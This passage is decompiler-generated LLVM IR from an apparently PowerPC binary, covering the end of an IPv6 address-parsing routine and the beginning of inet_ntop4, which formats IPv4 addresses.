  %v1_100133bc = add i32 %v0_100133a8, 1
  %v2_100133bc = inttoptr i32 %v1_100133bc to i8*
  %v3_100133bc = load i8, i8* %v2_100133bc, align 1
  %v4_100133bc = zext i8 %v3_100133bc to i32
  store i32 %v4_100133bc, i32* %r0.global-to-local, align 4
  store i32 %v1_100133bc, i32* @r29, align 4
  %v3_100133c0 = icmp eq i8 %v3_100133bc, 58
  br i1 %v3_100133c0, label %dec_label_pc_100133c8, label %dec_label_pc_10013548

dec_label_pc_100133c8:                            ; preds = %dec_label_pc_100133bc, %dec_label_pc_10013398
  %v0_100133c8 = phi i32 [ %v1_100133bc, %dec_label_pc_100133bc ], [ %v0_100133a8, %dec_label_pc_10013398 ]
  store i32 %v0_100133c8, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001349c3036 = inttoptr i32 %v0_100133c8 to i8*
  %v2_1001349c3137 = load i8, i8* %v1_1001349c3036, align 1
  %v3_1001349c3238 = zext i8 %v2_1001349c3137 to i32
  store i32 %v3_1001349c3238, i32* %r3.global-to-local, align 4
  store i32 268514468, i32* @lr, align 4
  %v1_100134a03339 = call i32 @__GI_tolower(i32 %v3_1001349c3238)
  store i32 %v1_100134a03339, i32* %r3.global-to-local, align 4
  store i32 %v1_100134a03339, i32* @r30, align 4
  %v3_100134a43440 = icmp eq i32 %v1_100134a03339, 0
  br i1 %v3_100134a43440, label %dec_label_pc_100134ac, label %dec_label_pc_100133d4.lr.ph

dec_label_pc_100133d4:                            ; preds = %dec_label_pc_100133d4.lr.ph, %dec_label_pc_1001349c.backedge
  %v1_100134a035 = phi i32 [ %v1_100134a03341, %dec_label_pc_100133d4.lr.ph ], [ %v1_100134a0, %dec_label_pc_1001349c.backedge ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001a528.842 to i32), i32* @r25, align 4
  %v0_100133e0 = load i32, i32* @r29, align 4
  %v1_100133e0 = add i32 %v0_100133e0, 1
  store i32 %v1_100133e0, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001a528.842 to i32), i32* @r3, align 4
  store i32 268514284, i32* @lr, align 4
  %v3_100133e8 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1001a528.842 to i32), i32 %v1_100134a035)
  store i32 %v3_100133e8, i32* %r3.global-to-local, align 4
  %v3_100133ec = icmp eq i32 %v3_100133e8, 0
  br i1 %v3_100133ec, label %dec_label_pc_1001340c, label %dec_label_pc_100133f4

dec_label_pc_100133f4:                            ; preds = %dec_label_pc_100133d4
  %v0_100133f4 = load i32, i32* @r25, align 4
  %v2_100133f4 = sub i32 %v3_100133e8, %v0_100133f4
  store i32 %v2_100133f4, i32* %r0.global-to-local, align 4
  %v0_100133f8 = load i32, i32* @r28, align 4
  %v1_100133f8 = mul i32 %v0_100133f8, 16
  store i32 %v1_100133f8, i32* %r9.global-to-local, align 4
  %v2_100133fc = or i32 %v1_100133f8, %v2_100133f4
  store i32 %v2_100133fc, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_100133fc, 65536
  br i1 %tmp19, label %dec_label_pc_10013498, label %dec_label_pc_10013548

dec_label_pc_1001340c:                            ; preds = %dec_label_pc_100133d4
  %v0_1001340c = load i32, i32* @r30, align 4
  %v3_1001340c = icmp eq i32 %v0_1001340c, 58
  br i1 %v3_1001340c, label %dec_label_pc_10013414, label %dec_label_pc_10013468

dec_label_pc_10013414:                            ; preds = %dec_label_pc_1001340c
  %v0_10013414 = load i32, i32* @r23, align 4
  %v3_10013414 = icmp eq i32 %v0_10013414, 0
  br i1 %v3_10013414, label %dec_label_pc_1001341c, label %dec_label_pc_10013430

dec_label_pc_1001341c:                            ; preds = %dec_label_pc_10013414
  %v0_1001341c = load i32, i32* @r24, align 4
  %v3_1001341c = icmp eq i32 %v0_1001341c, 0
  br i1 %v3_1001341c, label %dec_label_pc_10013424, label %dec_label_pc_10013548

dec_label_pc_10013424:                            ; preds = %dec_label_pc_1001341c
  %v0_10013424 = load i32, i32* @r31, align 4
  store i32 %v0_10013424, i32* @r24, align 4
  %v0_10013428 = load i32, i32* @r29, align 4
  store i32 %v0_10013428, i32* @r26, align 4
  br label %dec_label_pc_1001349c.backedge

dec_label_pc_10013430:                            ; preds = %dec_label_pc_10013414
  %v0_10013430 = load i32, i32* @r29, align 4
  %v1_10013430 = inttoptr i32 %v0_10013430 to i8*
  %v2_10013430 = load i8, i8* %v1_10013430, align 1
  %v3_10013430 = zext i8 %v2_10013430 to i32
  store i32 %v3_10013430, i32* %r0.global-to-local, align 4
  %v3_10013434 = icmp eq i8 %v2_10013430, 0
  br i1 %v3_10013434, label %dec_label_pc_10013548, label %dec_label_pc_1001343c

dec_label_pc_1001343c:                            ; preds = %dec_label_pc_10013430
  %v0_1001343c = load i32, i32* @r31, align 4
  %v1_1001343c = add i32 %v0_1001343c, 2
  store i32 %v1_1001343c, i32* %r0.global-to-local, align 4
  %v1_10013440 = load i32, i32* @r27, align 4
  %v3_10013440 = icmp ugt i32 %v1_1001343c, %v1_10013440
  br i1 %v3_10013440, label %dec_label_pc_10013548, label %dec_label_pc_10013448

dec_label_pc_10013448:                            ; preds = %dec_label_pc_1001343c
  %v0_10013448 = load i32, i32* @r28, align 4
  %v1_10013448 = udiv i32 %v0_10013448, 256
  store i32 %v1_10013448, i32* %r0.global-to-local, align 4
  %v1_1001344c = trunc i32 %v0_10013448 to i8
  %v3_1001344c = add i32 %v0_1001343c, 1
  %v4_1001344c = inttoptr i32 %v3_1001344c to i8*
  store i8 %v1_1001344c, i8* %v4_1001344c, align 1
  %v0_10013450 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013450 = trunc i32 %v0_10013450 to i8
  %v2_10013450 = load i32, i32* @r31, align 4
  %v3_10013450 = inttoptr i32 %v2_10013450 to i8*
  store i8 %v1_10013450, i8* %v3_10013450, align 1
  %v0_10013454 = load i32, i32* @r29, align 4
  store i32 %v0_10013454, i32* @r26, align 4
  %v0_10013458 = load i32, i32* @r31, align 4
  %v1_10013458 = add i32 %v0_10013458, 2
  store i32 %v1_10013458, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001349c30 = inttoptr i32 %v0_10013454 to i8*
  %v2_1001349c31 = load i8, i8* %v1_1001349c30, align 1
  %v3_1001349c32 = zext i8 %v2_1001349c31 to i32
  store i32 %v3_1001349c32, i32* %r3.global-to-local, align 4
  store i32 268514468, i32* @lr, align 4
  %v1_100134a033 = call i32 @__GI_tolower(i32 %v3_1001349c32)
  store i32 %v1_100134a033, i32* %r3.global-to-local, align 4
  store i32 %v1_100134a033, i32* @r30, align 4
  %v3_100134a434 = icmp eq i32 %v1_100134a033, 0
  br i1 %v3_100134a434, label %dec_label_pc_100134ac, label %dec_label_pc_100133d4.lr.ph

dec_label_pc_100133d4.lr.ph:                      ; preds = %dec_label_pc_100133c8, %dec_label_pc_10013448
  %v1_100134a03341 = phi i32 [ %v1_100134a033, %dec_label_pc_10013448 ], [ %v1_100134a03339, %dec_label_pc_100133c8 ]
  br label %dec_label_pc_100133d4

dec_label_pc_10013468:                            ; preds = %dec_label_pc_1001340c
  %v3_10013468 = icmp eq i32 %v0_1001340c, 46
  br i1 %v3_10013468, label %dec_label_pc_10013470, label %dec_label_pc_10013548

dec_label_pc_10013470:                            ; preds = %dec_label_pc_10013468
  %v0_10013470 = load i32, i32* @r31, align 4
  %v1_10013470 = add i32 %v0_10013470, 4
  store i32 %v1_10013470, i32* @r30, align 4
  %v1_10013474 = load i32, i32* @r27, align 4
  %v3_10013474 = icmp ugt i32 %v1_10013470, %v1_10013474
  br i1 %v3_10013474, label %dec_label_pc_10013548, label %dec_label_pc_1001347c

dec_label_pc_1001347c:                            ; preds = %dec_label_pc_10013470
  %v0_10013480 = load i32, i32* @r26, align 4
  store i32 %v0_10013480, i32* %r3.global-to-local, align 4
  store i32 268514440, i32* @lr, align 4
  %v3_10013484 = call i32 @inet_pton4(i32 %v0_10013480, i32 %v0_10013470)
  store i32 %v3_10013484, i32* %r3.global-to-local, align 4
  %v0_10013488 = load i32, i32* @r30, align 4
  store i32 %v0_10013488, i32* @r31, align 4
  %v2_1001348c = icmp sgt i32 %v3_10013484, 0
  br i1 %v2_1001348c, label %dec_label_pc_100134d0, label %dec_label_pc_10013548

dec_label_pc_10013498:                            ; preds = %dec_label_pc_100133f4
  store i32 1, i32* @r23, align 4
  %v0_1001349c.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001349c.backedge

dec_label_pc_1001349c.backedge:                   ; preds = %dec_label_pc_10013498, %dec_label_pc_10013424
  %v0_1001349c.be = phi i32 [ %v0_1001349c.pre.pre, %dec_label_pc_10013498 ], [ %v0_10013428, %dec_label_pc_10013424 ]
  %v1_1001349c = inttoptr i32 %v0_1001349c.be to i8*
  %v2_1001349c = load i8, i8* %v1_1001349c, align 1
  %v3_1001349c = zext i8 %v2_1001349c to i32
  store i32 %v3_1001349c, i32* %r3.global-to-local, align 4
  store i32 268514468, i32* @lr, align 4
  %v1_100134a0 = call i32 @__GI_tolower(i32 %v3_1001349c)
  store i32 %v1_100134a0, i32* %r3.global-to-local, align 4
  store i32 %v1_100134a0, i32* @r30, align 4
  %v3_100134a4 = icmp eq i32 %v1_100134a0, 0
  br i1 %v3_100134a4, label %dec_label_pc_100134ac, label %dec_label_pc_100133d4

dec_label_pc_100134ac:                            ; preds = %dec_label_pc_1001349c.backedge, %dec_label_pc_100133c8, %dec_label_pc_10013448
  %v0_100134ac = load i32, i32* @r23, align 4
  %v3_100134ac = icmp eq i32 %v0_100134ac, 0
  %v0_10013514.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_100134ac, label %dec_label_pc_100134d0, label %dec_label_pc_100134b4

dec_label_pc_100134b4:                            ; preds = %dec_label_pc_100134ac
  %v1_100134b4 = add i32 %v0_10013514.pre.pre, 2
  store i32 %v1_100134b4, i32* %r0.global-to-local, align 4
  %v1_100134b8 = load i32, i32* @r27, align 4
  %v3_100134b8 = icmp ugt i32 %v1_100134b4, %v1_100134b8
  br i1 %v3_100134b8, label %dec_label_pc_10013548, label %dec_label_pc_100134c0

dec_label_pc_100134c0:                            ; preds = %dec_label_pc_100134b4
  %v0_100134c0 = load i32, i32* @r28, align 4
  %v1_100134c0 = udiv i32 %v0_100134c0, 256
  store i32 %v1_100134c0, i32* %r0.global-to-local, align 4
  %v1_100134c4 = trunc i32 %v0_100134c0 to i8
  %v3_100134c4 = add i32 %v0_10013514.pre.pre, 1
  %v4_100134c4 = inttoptr i32 %v3_100134c4 to i8*
  store i8 %v1_100134c4, i8* %v4_100134c4, align 1
  %v0_100134c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100134c8 = trunc i32 %v0_100134c8 to i8
  %v2_100134c8 = load i32, i32* @r31, align 4
  %v3_100134c8 = inttoptr i32 %v2_100134c8 to i8*
  store i8 %v1_100134c8, i8* %v3_100134c8, align 1
  %v0_100134cc = load i32, i32* @r31, align 4
  %v1_100134cc = add i32 %v0_100134cc, 2
  store i32 %v1_100134cc, i32* @r31, align 4
  br label %dec_label_pc_100134d0

dec_label_pc_100134d0:                            ; preds = %dec_label_pc_100134ac, %dec_label_pc_1001347c, %dec_label_pc_100134c0
  %v0_10013514.pre = phi i32 [ %v0_10013488, %dec_label_pc_1001347c ], [ %v1_100134cc, %dec_label_pc_100134c0 ], [ %v0_10013514.pre.pre, %dec_label_pc_100134ac ]
  %v0_100134d0 = load i32, i32* @r24, align 4
  %v3_100134d0 = icmp eq i32 %v0_100134d0, 0
  %v1_10013514.pre = load i32, i32* @r27, align 4
  %v4_10013514 = icmp eq i32 %v0_10013514.pre, %v1_10013514.pre
  br i1 %v3_100134d0, label %dec_label_pc_10013514, label %dec_label_pc_100134d8

dec_label_pc_100134d8:                            ; preds = %dec_label_pc_100134d0
  %v2_100134dc = sub i32 %v0_10013514.pre, %v0_100134d0
  store i32 %v2_100134dc, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_10013514, label %dec_label_pc_10013548, label %dec_label_pc_100134fc.preheader

dec_label_pc_100134fc.preheader:                  ; preds = %dec_label_pc_100134d8
  %v3_100134fc24 = icmp slt i32 %v2_100134dc, 1
  %v2_1001350026 = add i32 %v2_100134dc, -1
  store i32 %v2_1001350026, i32* %r10.global-to-local, align 4
  %v2_1001350427 = add i32 %v1_10013514.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_100134fc24, label %dec_label_pc_10013514.thread, label %dec_label_pc_100134f0

dec_label_pc_100134f0:                            ; preds = %dec_label_pc_100134fc.preheader, %dec_label_pc_100134f0.dec_label_pc_100134f0_crit_edge
  %v0_100134f0 = phi i32 [ %v0_100134f0.pre, %dec_label_pc_100134f0.dec_label_pc_100134f0_crit_edge ], [ %v0_100134d0, %dec_label_pc_100134fc.preheader ]
  %v2_1001350429 = phi i32 [ %v2_10013504, %dec_label_pc_100134f0.dec_label_pc_100134f0_crit_edge ], [ %v2_1001350427, %dec_label_pc_100134fc.preheader ]
  %v2_1001350028 = phi i32 [ %v2_10013500, %dec_label_pc_100134f0.dec_label_pc_100134f0_crit_edge ], [ %v2_1001350026, %dec_label_pc_100134fc.preheader ]
  %v2_100134f0 = add i32 %v0_100134f0, %v2_1001350028
  %v3_100134f0 = inttoptr i32 %v2_100134f0 to i8*
  %v4_100134f0 = load i8, i8* %v3_100134f0, align 1
  %v5_100134f0 = zext i8 %v4_100134f0 to i32
  store i32 %v5_100134f0, i32* %r0.global-to-local, align 4
  %v3_100134f4 = inttoptr i32 %v2_1001350429 to i8*
  store i8 %v4_100134f0, i8* %v3_100134f4, align 1
  %v0_100134f8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100134f8 = load i32, i32* @r24, align 4
  %v2_100134f8 = load i32, i32* %r10.global-to-local, align 4
  %v3_100134f8 = trunc i32 %v0_100134f8 to i8
  %v4_100134f8 = add i32 %v2_100134f8, %v1_100134f8
  %v5_100134f8 = inttoptr i32 %v4_100134f8 to i8*
  store i8 %v3_100134f8, i8* %v5_100134f8, align 1
  %v0_100134fc.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_100134fc.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10013504.pre = load i32, i32* @r27, align 4
  %v3_100134fc = icmp slt i32 %v1_100134fc.pre, %v0_100134fc.pre
  %v2_10013500 = sub i32 %v1_100134fc.pre, %v0_100134fc.pre
  store i32 %v2_10013500, i32* %r10.global-to-local, align 4
  %v1_10013508 = add i32 %v0_100134fc.pre, 1
  store i32 %v1_10013508, i32* %r9.global-to-local, align 4
  br i1 %v3_100134fc, label %dec_label_pc_10013514.thread, label %dec_label_pc_100134f0.dec_label_pc_100134f0_crit_edge

dec_label_pc_100134f0.dec_label_pc_100134f0_crit_edge: ; preds = %dec_label_pc_100134f0
  %v2_10013504 = sub i32 %v1_10013504.pre, %v0_100134fc.pre
  %v0_100134f0.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_100134f0

dec_label_pc_10013514.thread:                     ; preds = %dec_label_pc_100134f0, %dec_label_pc_100134fc.preheader
  %v0_10013510.lcssa = phi i32 [ %v1_10013514.pre, %dec_label_pc_100134fc.preheader ], [ %v1_10013504.pre, %dec_label_pc_100134f0 ]
  store i32 %v0_10013510.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1001351c

dec_label_pc_10013514:                            ; preds = %dec_label_pc_100134d0
  br i1 %v4_10013514, label %dec_label_pc_1001351c, label %dec_label_pc_10013548

dec_label_pc_1001351c:                            ; preds = %dec_label_pc_10013514.thread, %dec_label_pc_10013514
  %v0_1001351c = load i32, i32* @r22, align 4
  store i32 %v0_1001351c, i32* @r3, align 4
  store i32 %v2_10013398, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001352c.843 to i32), i32* @lr, align 4
  %v0_10013528 = call i32 @memcpy()
  store i32 %v0_10013528, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001354c

dec_label_pc_10013534:                            ; preds = %dec_label_pc_10013378
  %v0_10013534 = call i32 @__errno_location()
  store i32 %v0_10013534, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10013540 = inttoptr i32 %v0_10013534 to i32*
  store i32 97, i32* %v2_10013540, align 4
  %v0_10013550.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001354c

dec_label_pc_10013548:                            ; preds = %dec_label_pc_1001343c, %dec_label_pc_10013430, %dec_label_pc_100133f4, %dec_label_pc_1001341c, %dec_label_pc_100134d8, %dec_label_pc_1001347c, %dec_label_pc_10013468, %dec_label_pc_10013514, %dec_label_pc_100133bc, %dec_label_pc_100134b4, %dec_label_pc_10013470
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001354c

dec_label_pc_1001354c:                            ; preds = %dec_label_pc_10013534, %dec_label_pc_1001351c, %dec_label_pc_10013384, %dec_label_pc_10013548
  %v0_10013550 = phi i32 [ %v0_10013550.pre, %dec_label_pc_10013534 ], [ 1, %dec_label_pc_1001351c ], [ %v3_1001338c, %dec_label_pc_10013384 ], [ 0, %dec_label_pc_10013548 ]
  store i32 %v0_1001335c, i32* %r0.global-to-local, align 4
  store i32 %v0_10013550, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013550

; uselistorder directives
  uselistorder i32 %v0_10013550, { 1, 0 }
  uselistorder i32 %v2_10013500, { 1, 0 }
  uselistorder i32 %v0_100134fc.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_10013514, { 1, 0 }
  uselistorder i32 %v0_10013514.pre, { 1, 0 }
  uselistorder i32 %v0_100134c0, { 1, 0 }
  uselistorder i32 %v0_10013514.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_100134a0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10013448, { 1, 0 }
  uselistorder i32 %v1_100133f8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 12, 13, 6, 7, 16, 9, 14, 8, 2, 1, 15, 4, 3, 17, 10, 18, 11, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268514468, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_1001354c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10013548, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1001351c, { 1, 0 }
  uselistorder label %dec_label_pc_100134f0, { 1, 0 }
  uselistorder label %dec_label_pc_100134d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100134ac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100133d4.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_100133d4, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100135bc.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_10013564 = load i32, i32* @lr, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_10013590 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_10013590, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_100135a0.846 to i32), i32* @lr, align 4
  %v3_1001359c = call i32 @__GI_memset(i32 %v2_10013590, i32 0, i32 15)
  store i32 %v3_1001359c, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_100136602 = load i32, i32* @r1, align 4
  store i32 %v0_100136602, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100135bc

dec_label_pc_100135bc:                            ; preds = %dec_label_pc_10013630.dec_label_pc_100135bc_crit_edge, %dec_label_pc_100135bc.lr.ph
  %v2_100135dc = phi i32 [ %v2_10013660, %dec_label_pc_10013630.dec_label_pc_100135bc_crit_edge ], [ %v0_100136602, %dec_label_pc_100135bc.lr.ph ]
  %v0_100135d0 = phi i32 [ %v0_10013660, %dec_label_pc_10013630.dec_label_pc_100135bc_crit_edge ], [ %v0_100136602, %dec_label_pc_100135bc.lr.ph ]
  %v0_100135c0 = phi i32 [ %v1_10013660, %dec_label_pc_10013630.dec_label_pc_100135bc_crit_edge ], [ 0, %dec_label_pc_100135bc.lr.ph ]
  %v1_100135c8 = phi i32 [ %v1_100135bc.pre, %dec_label_pc_10013630.dec_label_pc_100135bc_crit_edge ], [ 0, %dec_label_pc_100135bc.lr.ph ]
  %v0_100135bc = load i32, i32* %r31.global-to-local, align 4
  %v2_100135bc = add i32 %v0_100135bc, %v1_100135c8
  %v3_100135bc = inttoptr i32 %v2_100135bc to i8*
  %v4_100135bc = load i8, i8* %v3_100135bc, align 1
  %v5_100135bc = zext i8 %v4_100135bc to i32
  store i32 %v5_100135bc, i32* %r10.global-to-local, align 4
  store i32 %v0_100135c0, i32* %r8.global-to-local, align 4
  %v1_100135c4 = add i32 %v0_100135c0, 1
  store i32 %v1_100135c4, i32* %r11.global-to-local, align 4
  store i32 %v2_100135bc, i32* %r3.global-to-local, align 4
  %v1_100135cc = load i32, i32* @r28, align 4
  %v2_100135cc = udiv i32 %v5_100135bc, %v1_100135cc
  %v2_100135d0 = add i32 %v1_100135c4, %v0_100135d0
  store i32 %v2_100135d0, i32* %r6.global-to-local, align 4
  %v1_100135d4 = add nuw nsw i32 %v2_100135cc, 48
  %v1_100135d8 = urem i32 %v1_100135d4, 256
  store i32 %v1_100135d8, i32* %r0.global-to-local, align 4
  %v1_100135dc = trunc i32 %v1_100135d4 to i8
  %v3_100135dc = add i32 %v2_100135dc, 8
  %v4_100135dc = inttoptr i32 %v3_100135dc to i8*
  store i8 %v1_100135dc, i8* %v4_100135dc, align 1
  %v0_100135e0 = load i32, i32* %r0.global-to-local, align 4
  %v3_100135e0 = icmp eq i32 %v0_100135e0, 48
  %v0_100135e8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100135e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_100135e8 = udiv i32 %v0_100135e8, %v1_100135e8
  store i32 %v2_100135e8, i32* %r9.global-to-local, align 4
  br i1 %v3_100135e0, label %dec_label_pc_100135e8, label %dec_label_pc_10013614

dec_label_pc_100135e8:                            ; preds = %dec_label_pc_100135bc
  %v2_100135ec = udiv i32 %v2_100135e8, %v1_100135e8
  %tmp18 = mul i32 %v2_100135ec, -10
  %v2_100135f4 = add i32 %v2_100135e8, 48
  %v1_100135f8 = add i32 %v2_100135f4, %tmp18
  store i32 %v1_100135f8, i32* %r9.global-to-local, align 4
  %v1_100135fc = urem i32 %v1_100135f8, 256
  store i32 %v1_100135fc, i32* %r0.global-to-local, align 4
  %v1_10013600 = trunc i32 %v1_100135f8 to i8
  %v2_10013600 = load i32, i32* %r7.global-to-local, align 4
  %v3_10013600 = add i32 %v2_10013600, 8
  %v4_10013600 = inttoptr i32 %v3_10013600 to i8*
  store i8 %v1_10013600, i8* %v4_10013600, align 1
  %v0_10013604 = load i32, i32* %r0.global-to-local, align 4
  %v3_10013604 = icmp eq i32 %v0_10013604, 48
  br i1 %v3_10013604, label %dec_label_pc_10013630, label %dec_label_pc_1001360c

dec_label_pc_1001360c:                            ; preds = %dec_label_pc_100135e8
  %v0_1001360c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1001360c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10013630

dec_label_pc_10013614:                            ; preds = %dec_label_pc_100135bc
  %v0_10013618 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013618 = add i32 %v0_10013618, 1
  store i32 %v1_10013618, i32* %r8.global-to-local, align 4
  %v2_1001361c = udiv i32 %v2_100135e8, %v1_100135e8
  %v1_10013620 = mul i32 %v2_1001361c, 10
  store i32 %v1_10013620, i32* %r0.global-to-local, align 4
  %v2_10013624 = sub i32 %v2_100135e8, %v1_10013620
  %v1_10013628 = add i32 %v2_10013624, 48
  store i32 %v1_10013628, i32* %r9.global-to-local, align 4
  %v1_1001362c = trunc i32 %v1_10013628 to i8
  %v2_1001362c = load i32, i32* %r6.global-to-local, align 4
  %v3_1001362c = add i32 %v2_1001362c, 8
  %v4_1001362c = inttoptr i32 %v3_1001362c to i8*
  store i8 %v1_1001362c, i8* %v4_1001362c, align 1
  br label %dec_label_pc_10013630

dec_label_pc_10013630:                            ; preds = %dec_label_pc_100135e8, %dec_label_pc_1001360c, %dec_label_pc_10013614
  %v0_10013630 = load i32, i32* %r3.global-to-local, align 4
  %v1_10013630 = inttoptr i32 %v0_10013630 to i8*
  %v2_10013630 = load i8, i8* %v1_10013630, align 1
  %v3_10013630 = zext i8 %v2_10013630 to i32
  %v0_10013634 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013634 = add i32 %v0_10013634, 1
  %v0_10013638 = load i32, i32* @r1, align 4
  %v2_10013638 = add i32 %v0_10013638, %v0_10013634
  store i32 %v2_10013638, i32* %r10.global-to-local, align 4
  %v2_1001363c = add i32 %v1_10013634, %v0_10013638
  store i32 %v2_1001363c, i32* %r8.global-to-local, align 4
  %v1_10013640 = load i32, i32* %r5.global-to-local, align 4
  %v2_10013640 = udiv i32 %v3_10013630, %v1_10013640
  %v1_10013644 = add i32 %v0_10013634, 2
  store i32 %v1_10013644, i32* %r11.global-to-local, align 4
  %v0_10013648 = load i32, i32* %r4.global-to-local, align 4
  %v1_10013648 = add i32 %v0_10013648, 1
  store i32 %v1_10013648, i32* %r4.global-to-local, align 4
  %v1_1001364c = mul nuw nsw i32 %v2_10013640, 10
  store i32 %v1_1001364c, i32* %r0.global-to-local, align 4
  %v2_10013650 = sub nsw i32 %v3_10013630, %v1_1001364c
  %v1_10013654 = add nsw i32 %v2_10013650, 48
  store i32 %v1_10013654, i32* %r9.global-to-local, align 4
  %v1_10013658 = trunc i32 %v1_10013654 to i8
  %v3_10013658 = add i32 %v2_10013638, 8
  %v4_10013658 = inttoptr i32 %v3_10013658 to i8*
  store i8 %v1_10013658, i8* %v4_10013658, align 1
  %v0_1001365c = load i32, i32* %r12.global-to-local, align 4
  %v1_1001365c = trunc i32 %v0_1001365c to i8
  %v2_1001365c = load i32, i32* %r8.global-to-local, align 4
  %v3_1001365c = add i32 %v2_1001365c, 8
  %v4_1001365c = inttoptr i32 %v3_1001365c to i8*
  store i8 %v1_1001365c, i8* %v4_1001365c, align 1
  %v0_10013660 = load i32, i32* @r1, align 4
  %v1_10013660 = load i32, i32* %r11.global-to-local, align 4
  %v2_10013660 = add i32 %v1_10013660, %v0_10013660
  store i32 %v2_10013660, i32* %r7.global-to-local, align 4
  %v0_10013664 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013664 = add i32 %v0_10013664, -1
  store i32 %v1_10013664, i32* %ctr.global-to-local, align 4
  %v2_10013664 = icmp eq i32 %v1_10013664, 0
  br i1 %v2_10013664, label %dec_label_pc_10013668, label %dec_label_pc_10013630.dec_label_pc_100135bc_crit_edge

dec_label_pc_10013630.dec_label_pc_100135bc_crit_edge: ; preds = %dec_label_pc_10013630
  %v1_100135bc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100135bc

dec_label_pc_10013668:                            ; preds = %dec_label_pc_10013630
  %v2_10013668 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_10013668, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10013670 = add i32 %v1_10013660, %v2_10013668
  store i32 %v2_10013670, i32* %r9.global-to-local, align 4
  store i32 %v2_10013668, i32* @r3, align 4
  %v3_10013678 = add i32 %v2_10013670, -1
  %v4_10013678 = inttoptr i32 %v3_10013678 to i8*
  store i8 0, i8* %v4_10013678, align 1
